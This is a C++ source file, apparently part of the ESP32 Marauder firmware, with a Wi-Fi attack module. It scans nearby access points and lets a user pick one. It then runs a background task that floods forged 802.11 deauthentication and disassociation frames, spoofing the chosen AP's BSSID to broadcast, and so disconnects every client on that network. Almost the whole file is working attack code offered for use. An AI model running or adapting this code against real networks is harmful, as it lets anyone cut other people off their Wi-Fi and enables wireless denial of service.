/**
 * WiFi Attack Module - ESP32 Marauder
 * Scan APs + Deauth Attack Implementation
 */

#include "wifi_attack.h"

// AP storage
static APInfo apList[MAX_AP_COUNT];
static int apCount = 0;
static int selectedAP = -1;

// Deauth state
static bool deauthRunning = false;
static TaskHandle_t deauthTask = NULL;

// Deauth frame template (IEEE 802.11)
static uint8_t deauthFrame[26] = {
    0xC0, 0x00,                         // Frame Control (deauth)
    0x00, 0x00,                         // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (broadcast)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (target AP BSSID)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (target AP)
    0x00, 0x00,                         // Sequence number
    0x07, 0x00                          // Reason code (Class 3 frame)
};

// Disassociation frame template
static uint8_t disassocFrame[26] = {
    0xA0, 0x00,                         // Frame Control (disassoc)
    0x00, 0x00,                         // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (broadcast)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (target AP BSSID)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (target AP)
    0x00, 0x00,                         // Sequence number
    0x08, 0x00                          // Reason code
};

// Forward declarations
void deauthTaskFunc(void* param);

void wifi_attack_init() {
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    esp_wifi_set_promiscuous(false);
    Serial.println("[WiFi] Attack module initialized");
}

void wifi_scan_start() {
    Serial.println("[WiFi] Starting AP scan...");

    // Clear previous results
    apCount = 0;
    selectedAP = -1;

    // Perform scan
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);

    int networks = WiFi.scanNetworks(false, true); // async=false, show_hidden=true

    if (networks == WIFI_SCAN_FAILED) {
        Serial.println("[WiFi] Scan failed!");
        return;
    }

    apCount = min(networks, MAX_AP_COUNT);

    for (int i = 0; i < apCount; i++) {
        apList[i].ssid = WiFi.SSID(i);
        memcpy(apList[i].bssid, WiFi.BSSID(i), 6);
        apList[i].rssi = WiFi.RSSI(i);
        apList[i].channel = WiFi.channel(i);
        apList[i].encryption = WiFi.encryptionType(i);
        apList[i].selected = false;
    }

    Serial.printf("[WiFi] Found %d access points\n", apCount);
    WiFi.scanDelete();
}

void wifi_scan_stop() {
    WiFi.scanDelete();
    Serial.println("[WiFi] Scan stopped");
}

int wifi_get_ap_count() {
    return apCount;
}

APInfo* wifi_get_ap(int index) {
    if (index >= 0 && index < apCount) {
        return &apList[index];
    }
    return NULL;
}

void wifi_list_aps() {
    if (apCount == 0) {
        Serial.println("[WiFi] No APs found. Run 'scanap' first.");
        return;
    }

    Serial.println();
    Serial.println("=== Access Points ===");
    Serial.println("ID | RSSI | CH | ENC      | SSID");
    Serial.println("---|------|----|---------|-----------------");

    for (int i = 0; i < apCount; i++) {
        char marker = (i == selectedAP) ? '*' : ' ';
        Serial.printf("%c%d | %4d | %2d | %-8s | %s\n",
            marker,
            i,
            apList[i].rssi,
            apList[i].channel,
            wifi_auth_mode_str(apList[i].encryption).c_str(),
            apList[i].ssid.c_str()
        );
    }
    Serial.printf("\nTotal: %d APs", apCount);
    if (selectedAP >= 0) {
        Serial.printf(" | Selected: %d (%s)", selectedAP, apList[selectedAP].ssid.c_str());
    }
    Serial.println();
}

void wifi_select_ap(int index) {
    if (index < 0 || index >= apCount) {
        Serial.printf("[WiFi] Invalid AP index: %d (valid: 0-%d)\n", index, apCount-1);
        return;
    }

    // Clear previous selection
    if (selectedAP >= 0) {
        apList[selectedAP].selected = false;
    }

    selectedAP = index;
    apList[index].selected = true;

    Serial.printf("[WiFi] Selected AP %d: %s (CH:%d, BSSID:%s)\n",
        index,
        apList[index].ssid.c_str(),
        apList[index].channel,
        wifi_mac_to_string(apList[index].bssid).c_str()
    );
}

void wifi_clear_selection() {
    if (selectedAP >= 0) {
        apList[selectedAP].selected = false;
        selectedAP = -1;
    }
    Serial.println("[WiFi] Selection cleared");
}

APInfo* wifi_get_selected_ap() {
    if (selectedAP >= 0 && selectedAP < apCount) {
        return &apList[selectedAP];
    }
    return NULL;
}

// Deauth task - runs in background
void deauthTaskFunc(void* param) {
    APInfo* ap = (APInfo*)param;
    uint8_t channel = ap->channel;

    // Set channel
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

    // Copy BSSID to frames
    memcpy(&deauthFrame[10], ap->bssid, 6);  // Source
    memcpy(&deauthFrame[16], ap->bssid, 6);  // BSSID
    memcpy(&disassocFrame[10], ap->bssid, 6);
    memcpy(&disassocFrame[16], ap->bssid, 6);

    Serial.printf("[Deauth] Attacking %s on CH %d...\n", ap->ssid.c_str(), channel);

    uint32_t packetCount = 0;
    uint16_t seqNum = 0;

    while (deauthRunning) {
        // Update sequence number
        seqNum++;
        deauthFrame[22] = seqNum & 0xFF;
        deauthFrame[23] = (seqNum >> 8) & 0xFF;
        disassocFrame[22] = seqNum & 0xFF;
        disassocFrame[23] = (seqNum >> 8) & 0xFF;

        // Send deauth frames (broadcast)
        for (int i = 0; i < 5; i++) {
            esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof(deauthFrame), false);
            esp_wifi_80211_tx(WIFI_IF_STA, disassocFrame, sizeof(disassocFrame), false);
            packetCount += 2;
        }

        // Status update every ~100 packets
        if (packetCount % 100 == 0) {
            Serial.printf("[Deauth] Sent %lu packets\n", packetCount);
        }

        vTaskDelay(pdMS_TO_TICKS(10)); // 10ms delay
    }

    Serial.printf("[Deauth] Stopped. Total packets: %lu\n", packetCount);
    deauthTask = NULL;
    vTaskDelete(NULL);
}

void wifi_deauth_start() {
    if (deauthRunning) {
        Serial.println("[Deauth] Already running!");
        return;
    }

    APInfo* ap = wifi_get_selected_ap();
    if (ap == NULL) {
        Serial.println("[Deauth] No AP selected! Use 'select <n>' first.");
        return;
    }

    // Initialize WiFi in station mode with promiscuous
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);

    // Enable promiscuous mode for raw frame TX
    esp_wifi_set_promiscuous(true);

    deauthRunning = true;

    // Create deauth task
    xTaskCreatePinnedToCore(
        deauthTaskFunc,
        "deauth_task",
        4096,
        ap,
        1,
        &deauthTask,
        0  // Core 0
    );

    Serial.printf("[Deauth] Started attack on %s\n", ap->ssid.c_str());
}

void wifi_deauth_stop() {
    if (!deauthRunning) {
        Serial.println("[Deauth] Not running.");
        return;
    }

    deauthRunning = false;

    // Wait for task to finish
    delay(100);

    esp_wifi_set_promiscuous(false);
    Serial.println("[Deauth] Attack stopped");
}

bool wifi_is_deauthing() {
    return deauthRunning;
}

String wifi_auth_mode_str(wifi_auth_mode_t mode) {
    switch (mode) {
        case WIFI_AUTH_OPEN: return "OPEN";
        case WIFI_AUTH_WEP: return "WEP";
        case WIFI_AUTH_WPA_PSK: return "WPA";
        case WIFI_AUTH_WPA2_PSK: return "WPA2";
        case WIFI_AUTH_WPA_WPA2_PSK: return "WPA/WPA2";
        case WIFI_AUTH_WPA2_ENTERPRISE: return "WPA2-ENT";
        case WIFI_AUTH_WPA3_PSK: return "WPA3";
        default: return "UNKNOWN";
    }
}

String wifi_mac_to_string(uint8_t* mac) {
    char buf[18];
    snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X",
        mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return String(buf);
}
